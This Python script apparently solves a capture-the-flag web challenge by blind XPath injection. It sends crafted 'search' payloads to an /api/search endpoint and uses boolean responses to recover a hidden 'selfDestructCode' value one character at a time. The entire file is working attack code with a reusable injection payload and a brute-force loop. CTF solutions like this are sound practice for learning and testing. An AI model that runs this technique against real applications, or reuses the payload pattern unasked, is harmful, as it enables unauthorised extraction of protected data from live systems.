import requests

success_msg = "This millitary staff member exists."

# url = "http://138.68.182.20:31302/api/search"
url = "http://localhost:1337/api/search"

prefix = "CHTB{"
start_2 =  "" 
flag = prefix
ini_pos = len(flag)
len_1 = 21
len_2 = 15

headers = {
    'Content-Type': 'application/json',
}

charlist = ''
for chloop in range(256):
    charlist += chr(chloop)

# xpath = "']|(/military/district/staff/selfDestructCode)[1][substring(text(), 1, 1) = 'C"

def test_char(sdcIndex, pos, ch):
    print("Current Flag: {}".format(flag))
    print("item: '{}'; pos: '{}'; ch: '{}'".format(sdcIndex, pos, ch))
    xpath = "']|(/military/district/staff/selfDestructCode)[{}][substring(text(), {}, 1) = '{}".format(sdcIndex, pos, ch)
    data = {
        "search": xpath
    }

    response = requests.post(url, headers=headers, json=data, verify=False)

    if response.status_code == 200:
        jresult = response.json()
        return "success" in jresult
    else:
        print(response.status_code)
        print(response.text)

def check(item, start_pos, len_item):
    global flag

    # print(start_pos)
    # print(len_item)

    # len(part1)
    for i in range(start_pos, len_item+1):
        # charlist
        found = False
        for ch in charlist:
            if ord(ch) < 32:
                continue
            
            if ch == "'":
                continue

            if test_char(item, i+1, ch):
                flag += ch
                print("CURRENT FLAG: " + flag)
                found = True
                break
            else:
                print(".")
        
        if not(found):
            print("Search Finished!")
            break

check(1, ini_pos, len_1)
check(2, len(start_2), len_2)

print('Final Flag: ' + flag)
